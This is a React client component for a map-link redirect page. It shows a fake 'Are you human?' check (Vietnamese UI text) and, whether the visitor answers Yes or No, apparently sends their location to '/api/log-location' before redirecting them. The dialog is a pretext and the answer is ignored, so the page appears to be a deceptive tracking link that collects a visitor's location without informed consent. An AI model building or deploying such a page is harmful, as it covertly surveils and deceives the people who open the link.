'use client';

import { useEffect, useState, useCallback } from 'react';
import { Loader2 } from 'lucide-react';
import type { MapLinkConfig } from '@/app/actions/map-links';
import { useLocationLogger } from '@/hooks/use-location-logger';
import {
    AlertDialog,
    AlertDialogAction,
    AlertDialogCancel,
    AlertDialogContent,
    AlertDialogFooter,
    AlertDialogHeader,
    AlertDialogTitle,
} from "@/components/ui/alert-dialog";


interface MapRedirectClientProps {
  redirectUrl: string;
  config: MapLinkConfig;
}

export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
  const [statusText, setStatusText] = useState('Đang chờ xác nhận...');
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const { log } = useLocationLogger('/api/log-location', { from: 'link' });

  const handleConfirmHuman = useCallback(() => {
    setIsDialogOpen(false);
    setStatusText('Đang xác minh vị trí và chuyển hướng...');
    log({
        onSuccess: () => {
            window.location.href = redirectUrl;
        },
        onError: () => {
            window.location.href = redirectUrl;
        }
    });
  }, [log, redirectUrl]);

  const handleDenyHuman = () => {
    setIsDialogOpen(false);
    setStatusText('Đang chuyển hướng...');
    log({
        onSuccess: () => { window.location.href = redirectUrl; },
        onError: () => { window.location.href = redirectUrl; }
    });
  };
  
  useEffect(() => {
    const timer = setTimeout(() => setIsDialogOpen(true), 500);
    return () => clearTimeout(timer);
  }, []);
  
  return (
    <>
        <div className="flex justify-center items-center min-h-svh bg-background p-4">
        <div className="flex flex-col items-center gap-4 text-muted-foreground">
            <Loader2 className="h-12 w-12 animate-spin text-primary" />
            <p className="text-lg font-medium">{statusText}</p>
        </div>
        </div>
        <AlertDialog open={isDialogOpen}>
            <AlertDialogContent>
                <AlertDialogHeader>
                    <AlertDialogTitle>Bạn có phải là con người không?</AlertDialogTitle>
                </AlertDialogHeader>
                <AlertDialogFooter>
                    <AlertDialogCancel onClick={handleDenyHuman}>Không</AlertDialogCancel>
                    <AlertDialogAction onClick={handleConfirmHuman}>Có</AlertDialogAction>
                </AlertDialogFooter>
            </AlertDialogContent>
        </AlertDialog>
    </>
  );
}
